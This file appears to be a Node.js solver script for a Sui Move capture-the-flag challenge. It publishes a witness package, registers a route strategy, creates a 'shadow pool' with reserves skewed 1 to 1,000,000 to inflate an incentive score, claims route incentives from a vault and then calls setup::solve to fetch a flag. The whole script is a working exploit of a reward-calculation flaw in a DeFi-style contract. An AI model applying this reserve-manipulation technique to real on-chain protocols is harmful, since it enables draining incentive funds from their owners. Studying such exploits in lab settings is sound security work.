import { mkdtempSync, mkdirSync, writeFileSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { spawnSync } from "node:child_process";
import { SuiJsonRpcClient, JsonRpcHTTPTransport } from "@mysten/sui/jsonRpc";
import { Ed25519Keypair } from "@mysten/sui/keypairs/ed25519";
import { Transaction } from "@mysten/sui/transactions";

const required = [
  "RPC_URL", "PRIVKEY", "PACKAGE_ID", "SETUP_ID",
  "REGISTRY", "VAULT", "ACCOUNT", "ORACLE", "CONFIG",
];

for (const name of required) {
  if (!process.env[name]) throw new Error(`missing ${name}`);
}

async function stableFetch(input, init = {}) {
  const headers = new Headers(init.headers || {});
  headers.set("Connection", "close");
  headers.set("Content-Type", headers.get("Content-Type") || "application/json");
  let lastErr;
  for (let attempt = 0; attempt < 6; attempt++) {
    try { return await fetch(input, { ...init, headers, keepalive: false }); }
    catch (err) {
      lastErr = err;
      await new Promise((r) => setTimeout(r, 400 * (attempt + 1)));
    }
  }
  throw lastErr;
}

const client = new SuiJsonRpcClient({
  transport: new JsonRpcHTTPTransport({ url: process.env.RPC_URL, fetch: stableFetch }),
});
const keypair = Ed25519Keypair.fromSecretKey(process.env.PRIVKEY);
const pkg = process.env.PACKAGE_ID;
const usdc = `${pkg}::assets::USDC`;
const suix = `${pkg}::assets::SUIX`;

function buildWitnessPackage() {
  const dir = mkdtempSync(join(tmpdir(), "witness-"));
  mkdirSync(join(dir, "sources"));
  writeFileSync(join(dir, "Move.toml"),
    `[package]\nname = "arb"\nversion = "0.1.0"\nedition = "2024"\n\n[addresses]\narb = "0x0"\n`);
  writeFileSync(join(dir, "sources", "strategy.move"),
    `module arb::strategy;\npublic struct LatencyArb has drop {}\npublic fun witness(): LatencyArb { LatencyArb {} }\n`);
  const cfg = join(dir, "client.yaml");
  const ks = join(dir, "sui.keystore");
  writeFileSync(ks, "[]\n");
  writeFileSync(cfg,
    `---\nkeystore:\n  File: ${ks}\nenvs:\n  - alias: testnet\n    rpc: "https://fullnode.testnet.sui.io:443"\n    ws: ~\n    basic_auth: ~\n    chain_id: 4c78adac\nactive_env: testnet\nactive_address: ~\n`);
  try {
    const result = spawnSync("sui", [
      "move", "--client.config", cfg, "--client.env", "testnet", "build",
      "--path", dir, "--default-move-flavor", "sui", "-e", "testnet",
      "--dump-bytecode-as-base64", "--no-tree-shaking",
    ], { encoding: "utf8", env: { ...process.env } });
    if (result.status !== 0) throw new Error(result.stderr || result.stdout);
    return JSON.parse(result.stdout.trim().split("\n").at(-1));
  } finally { rmSync(dir, { recursive: true, force: true }); }
}

async function sendTx(tx, label) {
  tx.setGasBudget(50_000_000);
  const r = await client.signAndExecuteTransaction({
    signer: keypair, transaction: tx,
    options: { showEffects: true, showObjectChanges: true },
  });
  if (r.digest) await client.waitForTransaction({ digest: r.digest });
  console.log(`  ${label}: ${r.effects?.status?.status}`);
  if (r.effects?.status?.status !== "success") throw new Error(JSON.stringify(r.effects?.status));
  return r;
}

function findCreated(r, needle) {
  for (const c of r.objectChanges ?? [])
    if (c.type === "created" && c.objectType?.includes(needle)) return c.objectId;
  throw new Error("missing " + needle);
}

// Step 1: Publish witness package
console.log("\n[1/6] Publishing witness package (arb::strategy::LatencyArb)");
const compiled = buildWitnessPackage();
const pubTx = new Transaction();
const cap = pubTx.publish({ modules: compiled.modules, dependencies: compiled.dependencies });
pubTx.transferObjects([cap], pubTx.pure.address(keypair.toSuiAddress()));
pubTx.setGasBudget(100_000_000);
const pubR = await client.signAndExecuteTransaction({
  signer: keypair, transaction: pubTx, options: { showObjectChanges: true, showEffects: true },
});
if (pubR.digest) await client.waitForTransaction({ digest: pubR.digest });
let stratPkg;
for (const c of pubR.objectChanges ?? []) if (c.type === "published") stratPkg = c.packageId;
console.log(`  Published: ${stratPkg}`);
for (let i = 0; i < 40; i++) {
  try { if ((await client.getObject({ id: stratPkg })).data) break; } catch {}
  await new Promise((r) => setTimeout(r, 500));
}
const W = `${stratPkg}::strategy::LatencyArb`;

// Step 2: Register strategy for reversed market
console.log("\n[2/6] Registering route strategy <USDC, SUIX, LatencyArb>");
const regTx = new Transaction();
const w = regTx.moveCall({ target: `${stratPkg}::strategy::witness` });
regTx.moveCall({
  target: `${pkg}::registry::register_route_strategy`,
  typeArguments: [usdc, suix, W],
  arguments: [regTx.object(process.env.REGISTRY), w],
});
const regR = await sendTx(regTx, "register_route_strategy");
const strategyObj = findCreated(regR, "RouteStrategy");
console.log(`  Strategy: ${strategyObj}`);

// Step 3: Create shadow pool with skewed reserves
console.log("\n[3/6] Creating shadow pool <USDC, SUIX> reserves 1 : 1,000,000");
const cpTx = new Transaction();
cpTx.moveCall({
  target: `${pkg}::pool::create_route_pool`,
  typeArguments: [usdc, suix],
  arguments: [cpTx.object(process.env.REGISTRY), cpTx.object(process.env.CONFIG), cpTx.pure.u64(1), cpTx.pure.u64(1_000_000)],
});
const cpR = await sendTx(cpTx, "create_route_pool");
const shadowPool = findCreated(cpR, "RoutePool");
console.log(`  Shadow pool: ${shadowPool}`);

// Step 4: Open position and add liquidity
console.log("\n[4/6] Opening position + adding 500 liquidity");
const opTx = new Transaction();
opTx.moveCall({
  target: `${pkg}::pool::open_position`,
  typeArguments: [usdc, suix],
  arguments: [opTx.object(shadowPool)],
});
const opR = await sendTx(opTx, "open_position");
const position = findCreated(opR, "RoutePosition");
const alTx = new Transaction();
alTx.moveCall({
  target: `${pkg}::pool::add_liquidity`,
  typeArguments: [usdc, suix],
  arguments: [alTx.object(shadowPool), alTx.object(position), alTx.pure.u64(500), alTx.object(process.env.CONFIG)],
});
await sendTx(alTx, "add_liquidity");

// Step 5: Claim incentives
console.log("\n[5/6] Claiming route incentives (score = 1M, amount = min(1M, 1000) = 1000)");
const clTx = new Transaction();
clTx.moveCall({
  target: `${pkg}::vault::claim_route_incentives`,
  typeArguments: [usdc, suix, W],
  arguments: [
    clTx.object(process.env.VAULT), clTx.object(shadowPool),
    clTx.object(strategyObj), clTx.object(position),
    clTx.object(process.env.ACCOUNT), clTx.object(process.env.ORACLE),
    clTx.object(process.env.CONFIG),
  ],
});
await sendTx(clTx, "claim_route_incentives");
const acc = await client.getObject({ id: process.env.ACCOUNT, options: { showContent: true } });
console.log(`  earned: ${acc.data?.content?.fields?.earned}`);

// Step 6: Solve
console.log("\n[6/6] Calling setup::solve");
const solTx = new Transaction();
solTx.moveCall({
  target: `${pkg}::setup::solve`,
  arguments: [solTx.object(process.env.SETUP_ID), solTx.object(process.env.ACCOUNT), solTx.object(process.env.CONFIG)],
});
await sendTx(solTx, "setup::solve");
const setup = await client.getObject({ id: process.env.SETUP_ID, options: { showContent: true } });
console.log(`  solved: ${setup.data?.content?.fields?.solved}`);
console.log("\n✓ Done. Fetch flag: curl -s -b <jar> <origin>/flag");
